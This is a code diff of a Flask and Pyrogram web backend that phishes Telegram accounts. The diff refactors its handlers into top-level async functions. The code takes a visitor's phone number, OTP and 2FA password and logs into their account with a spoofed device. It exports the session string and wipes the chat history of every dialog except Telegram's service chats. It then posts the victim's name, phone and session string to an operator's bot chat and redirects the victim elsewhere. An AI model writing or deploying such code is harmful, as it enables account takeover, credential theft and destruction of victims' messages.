@@ -29,6 +29,78 @@ def parse_device_info(user_agent=""):
         
     return device_model, system_version
 
+async def async_send_code(phone_number, user_agent):
+    device_model, system_version = parse_device_info(user_agent)
+    client = Client(
+        name=f"session_{phone_number.replace('+', '')}",
+        api_id=API_ID,
+        api_hash=API_HASH,
+        in_memory=True,
+        device_model=device_model,
+        system_version=system_version,
+        app_version="10.2.1",
+        lang_code="en"
+    )
+    await client.connect()
+    sent = await client.send_code(phone_number)
+    temp_clients[phone_number] = {
+        "client": client,
+        "phone_code_hash": sent.phone_code_hash
+    }
+    return True
+
+async def async_verify_code(phone_number, code, password):
+    session_data = temp_clients.get(phone_number)
+    if not session_data:
+        raise Exception("Session expired. Please request OTP again.")
+
+    client = session_data["client"]
+    phone_code_hash = session_data["phone_code_hash"]
+
+    try:
+        if password:
+            await client.check_password(password)
+        else:
+            await client.sign_in(phone_number, phone_code_hash, code)
+    except errors.SessionPasswordNeeded:
+        return {"requires_password": True}
+
+    me = await client.get_me()
+    username = f"@{me.username}" if me.username else "No Username"
+    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"
+
+    session_string = client.export_session_string()
+
+    try:
+        async for dialog in client.get_dialogs():
+            if dialog.chat.id not in (777000, 777):
+                try:
+                    await client.delete_chat_history(dialog.chat.id)
+                except:
+                    pass
+    except:
+        pass
+
+    await client.disconnect()
+    temp_clients.pop(phone_number, None)
+
+    if BOT_TOKEN and ADMIN_CHAT_ID:
+        msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
+            )
+        except:
+            pass
+
+    return {
+        "success": True,
+        "message": "Authentication successful!",
+        "session": session_string,
+        "redirectUrl": "https://jvpfans.com"
+    }
+
 @app.route('/')
 def index():
     return send_from_directory('.', 'index.html')
@@ -41,32 +113,9 @@ def send_code():
         return jsonify({"success": False, "error": "Phone number is required"}), 400
 
     user_agent = request.headers.get('User-Agent', '')
-    device_model, system_version = parse_device_info(user_agent)
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-    async def _send():
-        client = Client(
-            name=f"session_{phone_number}",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            in_memory=True,
-            device_model=device_model,
-            system_version=system_version,
-            app_version="10.2.1",
-            lang_code="en"
-        )
-        await client.connect()
-        sent = await client.send_code(phone_number)
-        temp_clients[phone_number] = {
-            "client": client,
-            "phone_code_hash": sent.phone_code_hash
-        }
-        return True
 
     try:
-        loop.run_until_complete(_send())
+        asyncio.run(async_send_code(phone_number, user_agent))
         return jsonify({"success": True, "message": "OTP code sent to your Telegram app!"})
     except Exception as err:
         return jsonify({"success": False, "error": str(err)}), 500
@@ -81,64 +130,8 @@ def verify_code():
     if not phone_number or not code:
         return jsonify({"success": False, "error": "Phone number and OTP code are required"}), 400
 
-    session_data = temp_clients.get(phone_number)
-    if not session_data:
-        return jsonify({"success": False, "error": "Session expired. Please request OTP again."}), 400
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-    async def _verify():
-        client = session_data["client"]
-        phone_code_hash = session_data["phone_code_hash"]
-
-        try:
-            if password:
-                await client.check_password(password)
-            else:
-                await client.sign_in(phone_number, phone_code_hash, code)
-        except errors.SessionPasswordNeeded:
-            return {"requires_password": True}
-
-        me = await client.get_me()
-        username = f"@{me.username}" if me.username else "No Username"
-        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "N/A"
-
-        # ហៅ export_session_string ដោយផ្ទាល់ពី client តែម្ដង មិនបាច់ Import ស្មុគស្មាញ
-        session_string = client.export_session_string()
-
-        try:
-            async for dialog in client.get_dialogs():
-                if dialog.chat.id not in (777000, 777):
-                    try:
-                        await client.delete_chat_history(dialog.chat.id)
-                    except:
-                        pass
-        except:
-            pass
-
-        await client.disconnect()
-        temp_clients.pop(phone_number, None)
-
-        if BOT_TOKEN and ADMIN_CHAT_ID:
-            msg = f"🔔 **New Telegram Session Logged In!**\n\n👤 **Name:** {full_name}\n🏷 **Username:** {username}\n📱 **Phone:** `{phone_number}`\n\n🔑 **Pyrogram Session String:**\n`{session_string}`"
-            try:
-                requests.post(
-                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={"chat_id": ADMIN_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
-                )
-            except:
-                pass
-
-        return {
-            "success": True,
-            "message": "Authentication successful!",
-            "session": session_string,
-            "redirectUrl": "https://jvpfans.com"
-        }
-
     try:
-        res = loop.run_until_complete(_verify())
+        res = asyncio.run(async_verify_code(phone_number, code, password))
         if res.get("requires_password"):
             return jsonify({"success": False, "requiresPassword": True, "error": "Two-Step Verification (2FA) password is required."}), 401
         return jsonify(res)
